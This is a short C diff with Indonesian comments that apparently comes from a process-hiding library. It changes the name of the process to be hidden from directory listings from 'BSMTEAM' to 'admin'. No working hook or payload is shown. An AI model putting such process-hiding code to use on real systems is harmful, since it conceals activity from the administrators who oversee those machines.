@@ -9,7 +9,7 @@
 /*
  * Setiap proses dengan nama ini akan dikecualikan
  */
-static const char* process_to_filter = "BSMTEAM";
+static const char* process_to_filter = "admin";
 
 /*
  * Dapatkan nama direktori yang diberi pegangan DIR*
